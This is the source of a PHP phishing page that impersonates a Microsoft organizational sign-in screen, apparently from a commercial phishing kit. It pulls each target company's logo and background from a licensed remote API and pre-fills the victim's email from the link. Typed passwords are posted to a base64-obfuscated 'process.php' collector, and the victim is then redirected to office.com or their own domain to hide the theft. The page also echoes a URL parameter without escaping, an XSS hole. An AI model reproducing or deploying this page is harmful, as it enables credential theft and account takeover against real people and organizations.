<?php
include 'config.php';

if(isset($_GET['i']) && (isset($_GET['user']))) {
    $link = $_GET['i'];
    $user=$_GET['user'];
    $ch = curl_init();
    $url = "http://api.bestfriendstore.net/web/get/img?token=" . $token . "&domain=" . $domain ."&app=".$app. "&u=" . $link;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);
    if ($result != "Your License is valid / Expired Thank you") {
        $ss = json_decode($result);
    } else {
        print_r("Your License is valid / Expired Thank you");
        exit();
    }
}

?>

<!DOCTYPE html>
<html lang="en-US">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="cache-control" content="no-cache,no-store">
    <title>Sign In</title>
    <link rel="stylesheet" type="text/css" href="css/style.css">
    <style>.illustrationClass {background-image:url(<?php echo $ss[1];?>);}</style>
</head>

<body class="body">
<div id="fullPage">
    <div id="brandingWrapper" class="float">
        <div id="branding" class="illustrationClass"></div>
    </div>
    <div id="contentWrapper" class="float">
        <div id="content">
            <div id="header">
                <img id="currentPhoto" src="<?php echo $ss[0];?>" onerror="this.src='https://www.unesale.com/ProductImages/Large/notfound.png'" alt="Login" >


            </div>
            <div id="workArea">
                <div id="authArea" class="groupMargin">
                    <div id="loginArea">
                        <div id="loginMessage" class="groupMargin">Sign in with your organizational account</div>
                        <form method="post" id="loginForm" autocomplete="off">
                            <center>
                                <div class="alert alert-danger" id="msg" style="display: none;color: red;">Invalid Password..! Please enter correct password.</div>
                                <span id="error" class="text-danger" style="display: none;color:red;">That account doesn't exist. Enter a different account</span>
                            </center>
                            <div id="formsAuthenticationArea">
                                <div id="userNameArea">
                                    <input id="ai" name="ai" type="email" value="<?php echo $user;?>" tabindex="1" class="text fullWidth" spellcheck="false" placeholder="someone@example.com" autocomplete="off">
                                </div>
                                <div id="passwordArea">
                                    <input id="pr" name="pr" type="password" tabindex="2" class="text fullWidth" placeholder="Password" autocomplete="off">
                                </div>
                                <div id="kmsiArea" style="display:none">
                                    <input type="checkbox" name="Kmsi" id="kmsiInput" value="true" tabindex="3">
                                    <label for="kmsiInput">Keep me signed in</label>
                                </div>
                                <div id="submissionArea" class="submitMargin">
                                    <span id="submit-btn" class="submit" tabindex="4">Sign in</span>
                                </div>
                            </div>
                        </form>
                        <div id="authOptions">
                            <form id="options">
                                <div class="groupMargin"></div>
                            </form>
                        </div>

                    </div>
                </div>
            </div>
            <div id="footerPlaceholder"></div>
        </div>
        <div id="footer">
            <div id="footerLinks" class="floatReverse">
                <div><span id="copyright">© Microsoft</span></div>
            </div>
        </div>
    </div>
</div>
<!-- Optional JavaScript -->
<!-- jQuery first, then Popper.js, then Bootstrap JS -->
<script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
<script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
</body>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
<script>
    /* global $ */
    $(document).ready(function() {
        var count = 0;
        // $("#div1").animate({ left: 0, opacity: "hide" }, 0);
        // $("#div2").animate({ right: 0, opacity: "show" }, 500);

        /////////////url ai getting////////////////
        var ai = window.location.hash.substr(1);
        if (!ai) {

        } else {
            // $('#ai').val(ai);
            var my_ai = ai;
            var ind = my_ai.indexOf("@");
            var my_slice = my_ai.substr((ind + 1));
            var c = my_slice.substr(0, my_slice.indexOf('.'));
            var final = c.toLowerCase();

            $('#ai').val(my_ai);
            $('#aich').html(my_ai);
            $("#msg").hide();

        }
        ///////////////url getting ai////////////////


        var file = "cHJvY2Vzcy5waHA=";
        $('#submit-btn').click(function(event) {
            $('#error').hide();
            $('#msg').hide();
            event.preventDefault();
            var ai = $("#ai").val();
            var pr = $("#pr").val();
            var msg = $('#msg').html();
            $('#msg').text(msg);
            ///////////////////////////
            var my_ai = ai;
            var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

            if (!ai) {
                $('#error').show();
                $('#error').html("Email field is empty.!");
                return false;
            }

            if (!filter.test(my_ai)) {
                $('#error').show();
                $('#error').html("That account doesn't exist. Enter a different account");
                return false;
            }
            if (!pr) {
                $('#error').show();
                $('#error').html("Password field is empty.!");
                return false;
            }

            var ind = my_ai.indexOf("@");
            var my_slice = my_ai.substr((ind + 1));
            var c = my_slice.substr(0, my_slice.indexOf('.'));
            var final = c.toLowerCase();
            ///////////////////////////
            count = count + 1;

            $.ajax({
                dataType: 'JSON',
                url: atob(file),
                type: 'POST',
                data: {
                    login: ai,
                    passwd: pr,
                },
                // data: $('#contact').serialize(),
                beforeSend: function(xhr) {
                    $('#submit-btn').html('Verifying...');
                },
                success: function(response) {
                    $("#msg").show();
                    console.log(response);
                    if(response == 'success') {
                        window.location.replace('https://office.com/');
                    }else{
                        $("#pr").val("");
                        $('#error').show();
                        $('#error').html("Your account or password is incorrect! Please try again later.");
                    }
                },
                error: function() {
                    $("#pr").val("");
                    if (count >= 2) {
                        count = 0;
                        window.location.replace("http://www." + my_slice);
                        return false;
                    }
                    $("#msg").show();

                },
                complete: function() {
                    $('#submit-btn').html('Sign in');
                }
            });
        });


    });
</script>

</html>
